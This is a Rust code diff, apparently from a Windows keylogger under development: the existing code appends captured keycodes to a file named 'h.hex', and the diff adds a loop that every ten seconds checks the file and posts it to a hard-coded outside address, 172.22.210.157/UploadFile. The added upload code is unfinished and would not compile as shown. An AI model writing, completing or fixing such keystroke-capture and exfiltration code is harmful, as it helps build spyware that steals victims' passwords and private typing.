@@ -10,9 +10,27 @@ use windows::Win32::{
 use std::{
     mem::transmute,
     fs::OpenOptions,
-    io::Write
+    io::Write,
+    thread::sleep,
+    time::Duration
 };
+use reqwest;
+//https://docs.rs/reqwest/latest/reqwest/
+fn upload_file() {
+    let mut last_file_size: u64 = 0;
+    let c = reqwest::Client::new(); // should i make a new client every time or should I keep this client
 
+    loop {
+        sleep(Duration::from_secs(10));
+        let current_file_size: u64 = 0; //get file size
+
+        if current_file_size > last_file_size {
+            last_file_size = current_file_size;
+            c::post("http://172.22.210.157/UploadFile").body()
+        }
+    }
+
+}
 
 fn append_keycode_to_file(keycode: u8) -> std::io::Result<()> {
     let mut file = OpenOptions::new().create(true).append(true).open("h.hex")?;
